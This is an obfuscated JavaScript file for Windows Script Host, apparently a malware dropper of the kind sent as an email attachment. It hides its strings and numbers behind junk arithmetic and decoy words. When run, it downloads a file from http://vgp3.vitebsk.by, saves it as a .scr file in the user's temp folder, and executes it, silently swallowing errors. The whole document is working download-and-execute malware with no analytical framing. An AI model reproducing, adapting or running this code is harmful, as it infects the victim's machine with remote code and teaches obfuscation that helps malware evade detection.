principleStimulus = (((([!+[] + !+[] + !+[]]) * ([!+[] + !+[] + !+[]]) * ([!+[] + !+[] + !+[]]) * ([!+[] + !+[] + !+[]]) * ([!+[] + !+[] + !+[]])) - (Math.pow(124, 2) - 15263)), this);
bandagePortion = ("Run");
bomberResistor = principleStimulus[("tandem", "WScript")];
bomberResistor[("career", "archive", "megaphone", "Sleep")](((([!+[] + !+[]]) * ([!+[] + !+[]] * [!+[] + !+[] + !+[]] - 1) * ([!+[] + !+[]]) * ([!+[] + !+[]] * [!+[] + !+[] + !+[]] - 1) * ([!+[] + !+[]] * [!+[] + !+[] + !+[]] - 1) * ([!+[] + !+[]]) * ([!+[] + !+[] + !+[]]) * ([!+[] + !+[]] * [!+[] + !+[] + !+[]] - 1) * ([!+[] + !+[]]) * ([!+[] + !+[]] * [!+[] + !+[] + !+[]] - 1) * ([!+[] + !+[] + !+[]])) / (([!+[] + !+[]] * [!+[] + !+[] + !+[]] - 1) * ([!+[] + !+[] + !+[]]) * ([!+[] + !+[]]))));
projectionMedicine = bomberResistor[("brilliant", "resource", "logic", "CreateObject")](("orientation", "combination", "routine", "WScript.Shell"));
articleSession = projectionMedicine[("ExpandEnvironmentStrings")](("citation", "aspect", "%TEMP%/")) + ("clientColony") + ("shorts", "printer", ".scr");
shuntTest = principleStimulus[("story", "depot", "WScript")][("volcano", "CreateObject")](("index", "MSXML2.XMLHTTP"));
shuntTest[("tick", function String.prototype.satelliteCalendar() {
	return this
}, "open")](("club", "fact", "GET"), ("author", "expertise", "http://vgp3.vitebsk.by/6/98yh8bb"), !(((([!+[] + !+[]]) * ([!+[] + !+[] + !+[]]) * ([!+[] + !+[]])) / ((((([+!+[]]))) ^ (43 - 41)) & ((Math.pow((244 - 110), (50 / 25)) - (198 | 17859)) / ((333 ^ 222) / (2 + 11))))) == (((((179 - 16), (10 * 4)) | ((Math.pow(1479, 2) - 2186154) / (47 & 55))) ^ ((([!+[] + !+[] + !+[]]) * ([!+[] + !+[]] * [!+[] + !+[] + !+[]] - (1 + 0)) * ([!+[] + !+[]] * [!+[] + !+[] + !+[]] + (0 | 1))) & ((9 ^ 31) ^ (1188 / 12)))), (((0 | (1 * 0)) | ((2 | 48) / (40 + 10))) * ((22 - 20) + (1 + 1))))));
shuntTest[("boat", "migrate", "send")]();
while(shuntTest[("group", "readystate")] < ((31 ^ 127), (1 | 48), (4 | 4))) {
	principleStimulus[("imperative", "tampon", "WScript")][("Sleep")]((Math.pow((18 * 8 + 5), (17 - 15)) - 3 * 139 * 53));
}
scandalStorm = principleStimulus[("delta", "WScript")][("chief", "auction", "prince", "CreateObject")](("gigantic", "occupant", "ADODB.Stream"));
try {
	scandalStorm[("group", "open")]();
	scandalStorm[("commission", "gallery", "type")] = ((0 ^ 1) * (1 ^ 0));
	scandalStorm[("centre", "operative", "statuette", "normal", "write")](shuntTest[("ResponseBody")]);
	scandalStorm[("territory", "cycle", "progress", "genesis", "position")] = ((0 & 1) & 1);
	scandalStorm[("intelligence", "saveToFile")](articleSession, (0 | 2));
	scandalStorm[("specific", "close")]();
	projectionMedicine[bandagePortion](articleSession.satelliteCalendar(), ((70, 33) - (1584 / 48)), ((Math.pow(35, 2) - 1194) - (31)));
} catch(indifferentSymptom) {};